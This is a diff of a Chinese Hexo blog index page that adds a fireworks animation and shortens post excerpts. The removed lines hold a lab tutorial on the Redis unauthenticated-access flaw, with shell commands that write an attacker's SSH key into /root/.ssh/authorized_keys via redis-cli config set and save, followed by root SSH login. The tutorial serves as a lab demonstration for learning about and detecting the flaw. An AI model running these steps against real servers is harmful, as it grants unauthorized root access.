@@ -133,6 +133,10 @@
 
 </head>
 
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
@@ -352,27 +356,18 @@
       
         
           
-            <h2 id="redis是什么"><a href="#redis是什么" class="headerlink" title="redis是什么"></a>redis是什么</h2><p>redis是一个高性能的key-value数据库,开源,遵守BSD协议。</p>
-<h3 id="BSD协议"><a href="#BSD协议" class="headerlink" title="BSD协议"></a>BSD协议</h3><p>BSD开源协议是一个给于使用者很大自由的协议。可以自由的使用，修改源代码，也可以将修改后的代码作为开源或者专有软件再发布。</p>
-<h3 id="redis特点"><a href="#redis特点" class="headerlink" title="redis特点"></a>redis特点</h3><ul>
-<li>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的  时候可以再次加载进行使用。</li>
-<li>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</li>
-<li>Redis支持数据的备份，即master-slave模式的数据备份。<h2 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h2><h3 id="漏洞的影响"><a href="#漏洞的影响" class="headerlink" title="漏洞的影响"></a>漏洞的影响</h3>攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。<h3 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h3>Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。<h3 id="公钥登陆"><a href="#公钥登陆" class="headerlink" title="公钥登陆"></a>公钥登陆</h3>用户将自己的SSH公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，允许直接登录shell，不再要求密码。<br><img src="http://p5vwq294k.bkt.clouddn.com/%E5%9B%BE%E7%89%87.png" alt="enter description here"><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3>即只要向目标机器~/.ssh/authorized_keys的文件写入自己的公钥，就可以直接登陆目标机器的shell。<h2 id="渗透场景"><a href="#渗透场景" class="headerlink" title="渗透场景"></a>渗透场景</h2><img src="http://p5vwq294k.bkt.clouddn.com/redis.png" alt=""><h2 id="漏洞的重现和利用"><a href="#漏洞的重现和利用" class="headerlink" title="漏洞的重现和利用"></a>漏洞的重现和利用</h2><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3></li>
-</ul>
-<ol>
-<li>安装和启动redis服务<br>在win10下的虚拟机fedora26<br>安装redis时默认会将redis绑定在0.0.0.0：6397<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yum install redis*</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> redis-server</span></span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>2.安装ssh<br>linux中默认自带ssh<br>需要启动ssh<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> service sshd start</span></span><br></pre></td></tr></table></figure></p>
-<p>3.配置ssh<br>在.ssh目录下，获得公钥和私钥，将公钥前后加入两空行写入pub.txt文件中.<br>最后将pub.txt的内容连接到目标机器redis服务中键名为crackit的键值中，假设目标机器ip为：192.168.1.1<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /root/.ssh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen –t rsa</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> (<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; pub.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat foo.txt | redis-cli -h 192.168.1.1 -x <span class="built_in">set</span> crackit</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>连接reids服务<br>就跟redis的数据库文件保存路径<br>将前面保存的键值crackit加入”authorized_keys“末尾<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> redis-cli -h 192.168.1.11</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> config <span class="built_in">set</span> dir /root/.ssh/</span></span><br><span class="line">查看是否修改成功</span><br><span class="line"><span class="meta">$</span><span class="bash"> config get dir</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> config <span class="built_in">set</span> dbfilename <span class="string">"authorized_keys"</span></span></span><br><span class="line">获取当前数据库文件</span><br><span class="line"><span class="meta">$</span><span class="bash"> config get dbfilename</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> save</span></span><br></pre></td></tr></table></figure></p>
-<p>配置完后，就可以直接使用自己的私钥连接目标机器了</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh –i id_rsa root@192.168.1.1</span></span><br></pre></td></tr></table></figure>
-<h2 id="使用openvas验证"><a href="#使用openvas验证" class="headerlink" title="使用openvas验证"></a>使用openvas验证</h2><p><img src="http://p5vwq294k.bkt.clouddn.com/%E5%9B%BE%E7%89%871.png" alt="enter description here"><br>漏洞名称为Redis Server no password<br>根据openvas<br>漏洞产生的原因：是因为没有使用密码对Redis进行保护<br>检查漏洞的方法：连接远程的redis服务器查看它是否存在密码</p>
-<h3 id="查看扫描脚本nvt"><a href="#查看扫描脚本nvt" class="headerlink" title="查看扫描脚本nvt"></a>查看扫描脚本nvt</h3><p>NVT:Network Vulnerability Test网络漏洞测试<br>一个网络漏洞测试程序，用于检查目标系统是否存在一个特定的已知或潜在安全问题。<br>NVT在目录/var/lib/openvas/plugins/<br>根据扫描结果中的OID值可以在中找到NVT文件位置<a href="http://www.openvas.org/openvas-nvt-feed.html" target="_blank" rel="noopener">http://www.openvas.org/openvas-nvt-feed.html</a><br><img src="http://p5vwq294k.bkt.clouddn.com/%E5%9B%BE%E7%89%873.png" alt="enter description here"><br><img src="http://p5vwq294k.bkt.clouddn.com/%E5%9B%BE%E7%89%874.png" alt=""><br>脚本扫描原理获取redis使用端口号，查看redis是否具有密码如果redis没有密码则存在相关漏洞</p>
-<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>1.需要关闭SElinux<br>修改/etc/selinux/config 文件<br>将SELINUX=enforcing改为SELINUX=disabled<br>重启<br>2.redis默认开启了protected mode<br>在将公钥存在redis键中时会拒绝操作<br>使用提示中给出的临时改变配置的方法redis-server –proteced-mode no的方法关闭该模式。<br>3.只能获取到启动redis-server的用户权限<br>即如果是普通用户启动redis服务可能，入侵者就没有办法权限修改authorized_keys文件</p>
-
-          
+          redis是什么redis是一个高性能的key-value数据库,开源,遵守BSD协议。
+BSD协议BSD开源协议是一个给于使用者很大自由的协议。可以自由的使用，修改源代码，也可以将修改后的代码作为开源或者专有软件再发布。
+redis特点
+Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/03/19/redis未授权访问漏洞/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -490,17 +485,15 @@
       
         
           
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-          
+          Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in 
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/03/17/hello-world/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -658,8 +651,6 @@
   
 </div>
 
-
-  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
 
 
 
